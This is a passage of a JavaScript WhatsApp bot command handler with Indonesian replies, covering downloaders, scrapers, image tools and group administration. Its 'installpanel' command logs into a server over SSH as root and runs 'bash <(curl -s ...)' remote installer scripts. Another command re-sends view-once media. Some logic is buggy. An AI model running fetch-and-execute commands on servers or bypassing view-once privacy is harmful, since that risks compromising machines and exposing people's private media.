                        "buttonParamsJson": "{\"display_text\":\"PAYMENT QRIS 🎐\",\"id\":\"123456789\",\"copy_code\":\"https://files.catbox.moe/s5oi1u.jpg\"}"
                      },
                    ],
                  },
                },
                {
                  header: {
                    imageMessage: await image('https://files.catbox.moe/mps5wg.jpg'), 
                    hasMediaAttachment: true,
                  },
                  body: { text: `> QRIS LAIN` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": "{\"display_text\":\"PAYMENT QRIS TAMBAHAN 🎐\",\"id\":\"123456789\",\"copy_code\":\"https://files.catbox.moe/mps5wg.jpg\"}"
                      },
                    ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: fverif }
  );

  await dy.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break;


case 'buka': case 'rvo': {
    if (!quoted) return;
    let type = Object.keys(m.quoted.message)[0]
    let quotedType = m.quoted.message[type]
    var media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
    let buffer = Buffer.from([])
    for await (let chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        await dy.sendMessage(m.chat, {
            video: buffer,
            caption: quotedType.caption
        }, {
            quoted: fverif
        })
    } else if (/image/.test(type)) {
        await dy.sendMessage(m.chat, {
            image: buffer,
            caption: quotedType.caption
        }, {
            quoted: fverif
        })
    }
    }
    break
   
    
    
    case 'batoto': {
    try {
        const scrapeBatoto = async () => {
            const baseUrl = 'https://xbato.com';
            const response = await axios.get(baseUrl);
            const $ = cheerio.load(response.data);
            let results = [];
            $('.col.item.line-b.no-flag').each((index, element) => {
                const URL = baseUrl + $(element).find('a.item-cover').attr('href');
                const imageUrl = $(element).find('a.item-cover img').attr('src');
                const name = $(element).find('a.item-title').text().trim();
                const chapter = $(element).find('.item-volch a.visited').text().trim();
                const genre = $(element)
                    .find('.item-genre span, .item-genre u')
                    .map((i, el) => $(el).text().trim())
                    .get()
                    .join(', ');

                results.push({
                    URL,
                    imageUrl,
                    name,
                    chapter,
                    genre,
                });
            });
            return results;
        };

        const data = await scrapeBatoto();

        if (data.length === 0) {
            return m.reply('⚠️ Tidak ada data terbaru dari Batoto.');
        }

        let message = `*B A T O T O - L A T E S T*\n\n`;
        data.forEach((item, index) => {
            message += `*${index + 1}. ${item.name}*\n`;
            message += `◦ *Chapter*: ${item.chapter}\n`;
            message += `◦ *Genre*: ${item.genre}\n`;
            message += `◦ *URL*: ${item.URL}\n\n`;
        });

      m.reply(message);
    } catch (error) {
        m.reply('⚠️ Terjadi kesalahan saat memproses data.');
    }
    break;
}

    
    
    
case 'soundcloud': {
    if (!text) {
        return m.reply(`Masukan judul lagu\n\n*Contoh:* ${prefix + command} Neck Deep - December`);
    }

    const scrapeSoundCloud = async (query) => {
        try {
            const url = `https://m.soundcloud.com/search?q=${encodeURIComponent(query)}`;
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);

            let results = [];
            $('.List_VerticalList__2uQYU li').each((index, element) => {
                const title = $(element).find('.Cell_CellLink__3yLVS').attr('aria-label');
                const musicUrl = 'https://m.soundcloud.com' + $(element).find('.Cell_CellLink__3yLVS').attr('href');
                if (title && musicUrl) {
                    results.push({ title, url: musicUrl });
                }
            });

            return results.slice(0, 5);
        } catch (error) {
            return [];
        }
    };

    try {
        const searchResults = await scrapeSoundCloud(text);
        if (searchResults.length === 0) {
            return m.reply('⚠️ Tidak ada hasil ditemukan.');
        }

        const targetUrl = searchResults[0].url;
        await dy.sendMessage(m.chat, { react: { text: '🕜', key: m.key } });

        const stream = await scdl.download(targetUrl);
        const writeStream = fs.createWriteStream(path);

        stream.pipe(writeStream);

        writeStream.on('finish', async () => {
            const buffer = fs.readFileSync(path);

            await dy.sendMessage(
                m.chat,
                {
                    audio: buffer,
                    mimetype: 'audio/mpeg',
                    ptt: false,
                    contextInfo: {
                        mentions: participants.map(a => a.id),
                        externalAdReply: {
                            showAdAttribution: true,
                            mediaType: 1,
                            mediaUrl: '',
                            title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`,
                            body: `   ━━━━⬤──────────   `,
                            sourceUrl: 'https://m.soundcloud.com',
                            thumbnailUrl: `https://telegra.ph/file/662564e95a8fe4c21cb33.jpg`,
                            renderLargerThumbnail: true,
                        },
                    },
                },
                { quoted: fverif }
            );

            await dy.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            fs.unlinkSync(path);
        });

        writeStream.on('error', async () => {
            await dy.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            m.reply('⚠️ Gagal menyimpan file audio.');
        });
    } catch (error) {
        await dy.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        return m.reply('⚠️ Terjadi kesalahan saat memproses permintaan.');
    }
    break;
}


case 'smeme': {
    let [atas, bawah] = text.split`|`
    if (!mime) return m.reply(`Reply image,  *Example :* Top Text|Bottom Text`)
    if (!isMedia) return m.reply(`Mime ${mime} tidak didukung!`)
    let img = await quoted.download()
    let url = await Scraper.Uploader.ucarecdn(img)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas ? atas : '')}/${encodeURIComponent(bawah ? bawah : '')}.png?background=${url}`
    dy.sendImageAsSticker(m.chat, meme, m, { packname: packname, author: author })
    }
    break

case 'qc': {
		let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text;
		if (!teks) return reply(`Example: ${prefix + command} <Reply/Input Text>`);
		const res = await Scraper.Convert.quote(teks, ppuser, pushname)
		dy.sendImageAsSticker(m.chat, res, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    })
    }
    break
    
case 'tovn': {
if (limitnya < 1) return m.reply(mess.limit)
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`reply video/vn dengan caption ${prefix + command}`)
if (!quoted) return reply(`reply video/vn dengan caption ${prefix + command}`)
reply(mess.bugrespon)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
dy.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
uselimit()
}
break
    
 case 'toimg': {
 if (!quoted) reply ('m?.reply Image')
if (!/webp/.test(mime)) reply (`Balas sticker dengan caption *${prefix + command}*`)
let media = await dy.downloadAndSaveMediaMessage(quoted)
let ran = 'jjsjsnsu.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) reply (err)
let buffer = fs.readFileSync(ran)
dy.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case'searchsubdo':{
if (!text) return dy.reply(m.chat, 'Harap masukkan domain utama yang ingin dicari subdomainnya.', m);

const domain = text.trim().replace(/^https?:\/\//, '');
async function searchSubdomains(domain) {
    const url = `https://crt.sh/?q=${domain}&output=json`;
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        const subdomains = data.map(entry => entry.name_value);
        const uniqueSubdomains = [...new Set(subdomains)];
        uniqueSubdomains.sort();
        
        return uniqueSubdomains;
    } catch (error) {
        console.error('Error fetching subdomains:', error);
        return null;
    }
}
const subdomains = await searchSubdomains(domain);

if (subdomains) {
const message = subdomains.join('\n* ');
const total = subdomains.length;
dy.reply(m.chat, `Ditemukan ${total} subdomain untuk ${domain}:\n\n${message}`, m);
} else {
dy.reply(m.chat, 'Tidak ada hasil yang ditemukan atau terjadi kesalahan.', m);
}
};
break       

async function downloadAndSaveMediaMessage(quoted, type) {
    if (!quoted || !quoted.message || !quoted.message[type + "Message"] || !quoted.message[type + "Message"].mediaKey) {
        throw new Error("Media tidak valid atau tidak ditemukan.");
    }

    const stream = await downloadContentFromMessage(quoted.message[type + "Message"], type);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
    }
    const filePath = `./temp/${Date.now()}.${type}`;
    fs.writeFileSync(filePath, buffer);
    return filePath;
}
case "txt2img": {
  if (!text) return m.reply("Masukan teks!")
  
  try {
    const { data } = await axios({
      method: "GET",
      url: "https://hercai.onrender.com/v3/text2image",
      params: {
        prompt: text
      }
    });
    
    if (data.url) {
      await dy.sendMessage(m.chat, {
        image: {
          url: data.url
        },
        caption: `Hasil gambar untuk: *${text}*`
      }, { quoted: fverif });
    } else {
      m.reply("Gambar tidak dapat dihasilkan.");
    }

  } catch (e) {
    console.error(e);
    m.reply("Terjadi kesalahan saat memproses permintaan.");
  }
  break;
}
case "installpanel": {
    if (!isOwner) return;
    if (!text) return reply("ipvps|pwvps|panel.com|node.com|ramserver *(contoh: 100000)*");
    let vii = text.split("|");
    if (vii.length < 5) return reply("ipvps|pwvps|panel.com|node.com|ramserver *(contoh: 100000)*");

    const ress = new Client();
    const connSettings = {
        host: vii[0],
        port: '22',
        username: 'root',
        password: vii[1]
    };

    const passwordPanel = "admin" + getRandom("");
    const domainPanel = vii[2];
    const domainNode = vii[3];
    const ramServer = vii[4];
    const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;

    async function instalWings() {
        ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', async () => {
                ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async () => {
                        let teks = `
*Berikut Detail Akun Panel:*

* Username: admin
* Password: ${passwordPanel}
* Domain: ${domainPanel}

*Note:* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Dibuat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings:*
Ketik *.startwings* ipvps|pwvps|tokenwings
`;
                        await dy.sendMessage(m.chat, { text: teks }, { quoted: fverif });
                    }).on('data', async (data) => {
                        if (data.toString().includes("Masukkan nama lokasi: ")) stream.write("Singapore\n");
                        if (data.toString().includes("Masukkan deskripsi lokasi: ")) stream.write("Node By Bot\n");
                        if (data.toString().includes("Masukkan domain: ")) stream.write(`${domainNode}\n`);
                        if (data.toString().includes("Masukkan RAM (dalam MB): ")) stream.write(`${ramServer}\n`);
                    }).stderr.on('data', async (data) => console.log('Stderr: ' + data));
                });
            }).on('data', async (data) => console.log('Logger: ' + data.toString())).stderr.on('data', (data) => console.log('Stderr: ' + data));
        });
    }

    async function instalPanel() {
        ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', async () => {
                await instalWings();
            }).on('data', async (data) => {
                if (data.toString().includes('Input 0-6')) stream.write('0\n');
                if (data.toString().includes('(y/N)')) stream.write('y\n');
                if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) stream.write(`${domainPanel}\n`);
                if (data.toString().includes('Email address for the initial admin account')) stream.write('admin@gmail.com\n');
                if (data.toString().includes('Password for the initial admin account')) stream.write(`${passwordPanel}\n`);
            }).stderr.on('data', async (data) => console.log('Stderr: ' + data));
        });
    }

    ress.on('ready', async () => {
        await reply("Memproses *install* server panel\nTunggu 1-10 menit hingga proses selesai...");
        ress.exec('', async (err, stream) => {
            if (err) throw err;
            stream.on('close', async () => {
                await instalPanel();
            }).on('data', async (data) => console.log(data.toString())).stderr.on('data', async (data) => console.log('Stderr: ' + data));
        });
    }).connect(connSettings);
}
break;


case "imgurl":
    try {
        // Pastikan ada pesan yang di-reply
        if (!m.quoted) return reply("Reply gambar yang ingin diubah menjadi URL.");

        // Pastikan pesan yang di-reply valid
        if (!m.quoted.message) return reply("Pesan tidak valid.");

        // Periksa tipe pesan
        const messageType = Object.keys(m.quoted.message || {})[0];
        if (!messageType || !m.quoted.message[messageType]) {
            return reply("Pesan yang di-reply tidak memiliki konten.");
        }

        const mime = (m.quoted.message[messageType] || {}).mimetype || "";

        // Periksa apakah tipe adalah gambar
        if (!/image/.test(mime)) {
            return reply("❌ Fitur ini hanya mendukung gambar.");
        }

        // Unduh media dari pesan yang di-reply
        const media = await downloadAndSaveMediaMessage(m.quoted, "image");

        // Upload ke Telegraph
        const response = await axios.post('https://telegra.ph/upload', fs.createReadStream(media), {
            headers: { 'Content-Type': 'multipart/form-data' },
        });

        if (response.data && response.data[0] && response.data[0].src) {
            const telegraphUrl = `https://telegra.ph${response.data[0].src}`;
            const replyText = `✅ *Berhasil mengunggah gambar ke Telegraph!*\n\n🔗 URL: ${telegraphUrl}`;
            await reply(replyText);
        } else {
            throw new Error("Gagal mendapatkan URL dari Telegraph.");
        }

        // Hapus file sementara
        fs.unlinkSync(media);
    } catch (err) {
        console.error(err);
        await reply("❌ Gagal mengunggah gambar. Coba lagi nanti.");
    }
    break;


    

async function imagetohd(imageBuffer) {
    const formData = new FormData();
    formData.append('image', imageBuffer, {
        filename: 'upload.png',
        contentType: 'image/png',
    });

    const response = await axios.post(
        'https://www.videotok.app/api/free-restore-image',
        formData,
        {
            headers: {
                ...formData.getHeaders(),
            },
        }
    );

    const { imageUrl } = response.data;
    return imageUrl;
}

case 'hd': {
    if (!quoted) return reply("Reply gambar yang ingin diubah menjadi HD.");
    if (!/image/.test(mime)) return reply(`Fitur ini hanya mendukung gambar.`);

 
    const wait = await dy.sendMessage(m.chat, {
        text: `_Wait.. 🔍_`
    }, { quoted: fverif });

   
    let media = await quoted.download();

  
    let resultUrl = await imagetohd(media);

 
    await dy.sendMessage(m.chat, {
        text: `_Mengirim hasil.. 🔄_`,
        edit: wait.key
    }, { quoted: fverif });

   
    await dy.sendMessage(m.chat, {
        image: {
            url: resultUrl,
        },
        caption: 'SELESAI ✅',
    }, { quoted: fverif });

 
    dy.sendMessage(m.chat, {
        react: {
            text: '✨',
            key: m.key
        }
    });
    break;
}


case 'remini':{
if (limitnya < 1) return m.reply(mess.limit)
dy.enhancer = dy.enhancer ? dy.enhancer : {};
if (m.sender in dy.enhancer)
return dy.reply(m.chat, "Masih Ada Proses Yang Belum Selesai Kak, Silahkan Tunggu Sampai Selesai Yah >//<", m)
let q = m.quoted ? m.quoted : m;
let mime = (q.msg || q).mimetype || q.mediaType || "";
if (!mime)
return dy.reply(m.chat, `Send/Reply Images with the caption *${prefix + command}`, m)
if (!/image\/(jpe?g|png)/.test(mime))
return dy.reply(m.chat, `Mime ${mime} tidak support`, m)
else dy.enhancer[m.sender] = true;
dy.sendMessage(m.chat, {
react: {
text: '🕒',
key: m.key,
}
});
let img = await q.download?.();
let error;
try {
const This = await remini(img, "enhance");
dy.sendMessage(m.chat, {
react: {
text: '☑️',
key: m.key,
}
});
dy.sendFile(m.chat, This, "", "```Success...```", m);
} catch (er) {
error = true;
} finally {
if (error) {
dy.reply(m.chat, "Proses Gagal :(", m)
}
delete dy.enhancer[m.sender];
}
uselimit()}
break;
//BATAS CONVERT MENU

//SEARCH MENU

case'pin':
case'pinterest':{
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return reply(`*Example*: ${ prefix + command } Gojo Satoru`)
async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: dy.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: `${ownername}`
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"url","Klik disini":"${pus}","merchant_url":"${pus}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hasil Pencarian Dari ${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.ownername
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await dy.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
uselimit()}
break
case 'spotifydl': {
    if (!text) return m.reply("Silakan masukkan nama lagu atau URL Spotify untuk diunduh!");

    const Spotify = require('./media/spotify.js'); // Path file Spotify
    const fs = require('fs'); // File System untuk manipulasi file
    const path = require('path');

    try {
        // Memanggil fungsi searchAndDownload
        const result = await Spotify.searchAndDownload(text);

        if (result.status) {
            const data = result.data;
            
            // Unduh file audio
            const audioPath = path.resolve(__dirname, `./tmp/${data.title}.mp3`);
            const writer = fs.createWriteStream(audioPath);
            const response = await axios({
                url: data.download,
                method: 'GET',
                responseType: 'stream',
            });

            response.data.pipe(writer);

            // Tunggu proses unduhan selesai
            writer.on('finish', async () => {
                m.reply(`Berhasil mengunduh:\n\n🎵 Judul: ${data.title}\n👤 Artis: ${data.artist}\n⏱️ Durasi: ${data.duration}`);
                
                // Kirim file audio ke pengguna
                await dy.sendMessage(m.chat, { audio: { url: audioPath }, mimetype: 'audio/mpeg' }, { quoted: fverif });

                // Hapus file sementara
                fs.unlinkSync(audioPath);
            });

            writer.on('error', (error) => {
                m.reply(`Gagal mengunduh file audio: ${error.message}`);
            });
        } else {
            m.reply(`Gagal mengambil data: ${result.msg}`);
        }
    } catch (error) {
        m.reply("Terjadi kesalahan saat mengambil data dari Spotify: " + error.message);
        console.error("Error:", error);
    }
    break;
}
case 'splay': {
    if (!text) return m.reply("Silakan masukkan nama lagu atau URL Spotify untuk diunduh!");

    const Spotify = require('./media/spotify.js');
    const fs = require('fs');
    const path = require('path');
    const axios = require('axios');

    try {
        await dy.sendMessage(m.chat, { react: { text: '⌛', key: m.key } })
        await dy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
        await dy.sendMessage(m.chat, { react: { text: '⌛', key: m.key } })
        await dy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
        await dy.sendMessage(m.chat, { react: { text: '⌛', key: m.key } })
        await dy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
        await dy.sendMessage(m.chat, { react: { text: '⌛', key: m.key } })
        await dy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        const result = await Spotify.searchAndDownload(text);

        if (result.status) {
            const data = result.data;

            const audioPath = path.resolve(__dirname, `./tmp/${data.title}.mp3`);
            const writer = fs.createWriteStream(audioPath);
            const response = await axios({
                url: data.download,
                method: 'GET',
                responseType: 'stream',
            });

            response.data.pipe(writer);

            writer.on('finish', async () => {
                await dy.sendMessage(
                    m.chat,
                    {
                        audio: { url: audioPath },
                        mimetype: 'audio/mpeg',
                        ptt: false,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                mediaType: 1,
                                mediaUrl: data.url,
                                title: `🎵 ${data.title}`,
                                body: `🎤 ${data.artist}\n💿 ${data.album || "Tidak ada album"}\n📅 ${data.releaseDate || "Tidak diketahui"}`,
                                sourceUrl: data.url,
                                thumbnailUrl: data.cover,
                                renderLargerThumbnail: true,
                            },
                        },
                    },
                    { quoted: fverif }
                );

                await dy.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                fs.unlinkSync(audioPath);
            });

            writer.on('error', async (error) => {
                await dy.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                m.reply(`Gagal mengunduh file audio: ${error.message}`);
            });
        } else {
            await dy.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            m.reply(`Gagal mengambil data: ${result.msg}`);
        }
    } catch (error) {
        await dy.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        console.error("Error:", error);
        m.reply("Terjadi kesalahan saat mengambil data dari Spotify: " + error.message);
    }
    break;
}
case 'sendmsg': {
    if (!isCreator) return m.reply(mess.owner); 

    let [msg, number] = text.split(',');
    if (!msg || !number) return m.reply(`Format salah! Contoh: .sendmsg halo,628xxxxxxx`);
    
    const target = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    try {
        await dy.sendMessage(target, { text: msg });
        m.reply(`Pesan berhasil dikirim ke ${number}`);
    } catch (error) {
        console.error(error);
        m.reply(`Gagal mengirim pesan ke ${number}. Periksa nomor atau koneksi.`);
    }
    break;
}

case 'sendmedia': {
    if (!isCreator) return m.reply(mess.owner);

    if (!m.quoted) return m.reply("Balas media yang ingin dikirim dengan perintah ini.");
    if (!args[0]) return m.reply("Masukkan nomor tujuan! Contoh: .sendmedia 628xxxxxxx");

    const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const mime = m.quoted.mimetype || '';

    try {
        const media = await m.quoted.download();

        if (/image/.test(mime)) {
            await dy.sendMessage(target, { image: media, caption: "Gambar ini telah dikirim!" });
        } else if (/video/.test(mime)) {
            await dy.sendMessage(target, { video: media, caption: "Video ini telah dikirim!" });
        } else if (/audio/.test(mime)) {
            await dy.sendMessage(target, { audio: media, mimetype: 'audio/mp4' });
        } else {
            return m.reply("Media yang didukung hanya gambar, video, dan audio!");
        }

        m.reply(`${args[0]}`);
    } catch (error) {
        console.error(error);
        m.reply(`Gagal mengirim media ke ${args[0]}. Periksa nomor atau koneksi.`);
    }
    break;
}



case 'tiktoks': case 'tiktoksearch': case 'ttsearch': {
    if (limitnya < 1) return m.reply(mess.limit);
    if (!text) return reply(`*Example :* .${command} jedag jedug`);

    dy.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });

    try {
        let kemii = await tiktoks(`${text}`);
        dy.sendMessage(m.chat, {
            video: { url: kemii.no_watermark },
            caption: '```Result from:``` ' + '`' + text + '`'
        }, { quoted: fverif });

        uselimit();
    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat mengambil data dari TikTok.');
    }
    break;
}



case'spotifysearch':{
if (limitnya < 1) return m.reply(mess.limit)
  if (!text) return reply(`*Example*: ${prefix + command} Perfect - ed Sheeran`);
  try {
    let json = await searchSpotifyTracks(text);
    if (json.length < 1) return reply(`Tidak ada hasil ditemukan.`);
    let ini_txt = '*Spotify Search*';
    for (const x of json) {
      ini_txt += `
      
🎵 *Judul:* ${x.name}
👥 *Artis:* ${x.artists.map(v => v.name).join(', ')}
👥 *Artis Album:* ${x.album.artists.map(v => v.name).join(', ')}
🆔 *ID:* ${x.id}
📅 *Tanggal Rilis Album:* ${x.album.release_date}
🆔 *ID Album:* ${x.album.id}
🎵 *Jumlah Trek Album:* ${x.album.total_tracks}
🔢 *Nomor Trek:* ${x.album.track_number}
⏳ *Durasi:* ${x.duration_ms} ms
🔗 *Uri:* ${x.uri}
🎵 *URL Album*: ${x.album.external_urls.spotify}
🔗 *URL:* ${x.external_urls.spotify}
${x.preview_url ? `🎧 *Direct URL:* ${x.preview_url}` : ''}
───────────────────`;
    }
    reply(ini_txt);
  } catch (e) {
    return reply('*Spotify Search*\n\nTerjadi Kesalahan, Coba Lagi Nanti.');
  }
uselimit()};
break


 

//BATAS SEARCH MENU

//GROUP MENU

case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.Badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
dy.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case 'igdl': {
    if (!text) return m.reply("Silakan masukkan URL Instagram!");

    const fs = require('fs');
    const path = require('path');
    const Instagram = require('./lib/instagram');

    try {
       
        const result = await Instagram(text);

        if (!result || result.msg) 
            return m.reply(result.msg || "Gagal mengambil data dari Instagram.");

        const { url: mediaUrls, metadata } = result;

        if (!mediaUrls || mediaUrls.length === 0) 
            return m.reply("Tidak ada media yang ditemukan. Pastikan URL valid.");

     
        if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp');

        for (let mediaUrl of mediaUrls) {
            
            const isVideo = mediaUrl.includes('.mp4');
            const fileName = `${Date.now()}-${isVideo ? 'video.mp4' : 'image.jpg'}`;
            const filePath = path.resolve(__dirname, `./tmp/${fileName}`);

          
            const response = await axios({
                url: mediaUrl,
                method: 'GET',
                responseType: 'stream',
            });
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);

          
            await new Promise((resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            });

           
            const caption = `*Instagram Downloader*\n📄 *Username*: ${metadata.username}\n❤️ *Likes*: ${metadata.like}\n💬 *Comments*: ${metadata.comment}\n\n${metadata.caption || ''}`;

            if (isVideo) {
                await dy.sendMessage(m.chat, { video: { url: filePath }, caption }, { quoted: fverif });
            } else {
                await dy.sendMessage(m.chat, { image: { url: filePath }, caption }, { quoted: fverif });
            }

        
            fs.unlinkSync(filePath);
        }
    } catch (error) {
        m.reply("Terjadi kesalahan saat mengambil data dari Instagram: " + error.message);
        console.error("Error:", error);
    }
    break;
}





case 'searchimage': {
    if (!text) return m.reply("Silakan masukkan kata kunci pencarian!");

    try {
        const { gimage } = await import('neastooapi');
        const response = await gimage(text);

        if (!Array.isArray(response) || response.length === 0) {
            return m.reply("Tidak ada hasil yang ditemukan.");
        }

        async function createImage(url) {
            const { imageMessage } = await generateWAMessageContent(
                { image: { url } },
                { upload: dy.waUploadToServer }
            );
            return imageMessage;
        }

        function shuffleArray(array) {
            for (let i = array.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [array[i], array[j]] = [array[j], array[i]];
            }
        }

        shuffleArray(response);
        const limitedResults = response.slice(0, 5);
        const cards = [];

        for (const [i, item] of limitedResults.entries()) {
            cards.push({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: `${i + 1}. ${item.title}`
                }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({
                    text: `Source: ${item.url}`
                }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Hasil ${i + 1}`,
                    hasMediaAttachment: true,
                    imageMessage: await createImage(item.image)
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: "cta_url",
                            buttonParamsJson: `{"display_text":"URL","url":"${item.url}"}`
                        }
                    ]
                })
            });
        }

        const carouselMessage = proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards
        });

        const botMessage = generateWAMessageFromContent(m.chat, {
            interactiveMessage: {
                carouselMessage
            }
        }, {});

        await dy.relayMessage(m.chat, botMessage.message, {
            messageId: botMessage.key.id
        });
    } catch (error) {
        m.reply("Terjadi kesalahan: " + error.message);
    }
    break;
}

case 'acc': {
    if (!m.isGroup) return m.reply(mess.group)
    if (!isCreator && !isAdmins) return m.reply(mess.admin)
    if (!args[0]) return reply("*Perintah tidak valid.*\nGunakan:\n- *acc list*\n- *acc approve [number]*\n- *acc reject [number]*\n- *acc reject [JID]*\n- *acc reject/approve all* untuk menolak/menyetujui semua permintaan bergabung.");

    try {
        let groupId = m.chat;
        let [subCommand, options] = args;
        let joinRequestList = await dy.groupRequestParticipantsList(groupId);

        const formatDate = (timestamp) => new Intl.DateTimeFormat('id-ID', {
            weekday: 'long',
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        }).format(new Date(timestamp * 1000));

        if (subCommand === "list") {
            const formattedList = joinRequestList.length > 0 ?
                joinRequestList.map((request, i) => `*${i + 1}.*\n Nomor: ${request.jid.split('@')[0]}\n Metode Permintaan: ${request.request_method}\n Waktu Permintaan: ${formatDate(request.request_time)}\n\n`).join('') :
                "Tidak ada permintaan bergabung yang tertunda.";
            reply(`*Daftar Permintaan Bergabung:*\n\n${formattedList}`);
        }

        if (subCommand === "reject" || "approve") {
            if (options === "all") {
                for (const request of joinRequestList) {
                    await dy.groupRequestParticipantsUpdate(groupId, [request.jid], subCommand);
                    console.log(`Meng-${subCommand} participant dengan JID: ${request.jid}`);
                }
                reply(`*${subCommand === 'approve' ? 'Menyetujui' : 'Menolak'} semua permintaan bergabung.*`);
            } else {
                const actions = options.split(" ").map(action => action.trim());
                const participants = actions.map(action => joinRequestList[parseInt(action) - 1]).filter(request => request);
                if (participants.length > 0) {
                    let formattedResponse = '';
                    for (const request of participants) {
                        const response = await dy.groupRequestParticipantsUpdate(groupId, [request.jid], subCommand);
                        const status = response[0].status === 'success' ? 'Gagal' : 'Berhasil';
                        formattedResponse += `*${participants.indexOf(request) + 1}.*\n Status: ${status}\n Nomor: ${request.jid.split('@')[0]}\n\n`;
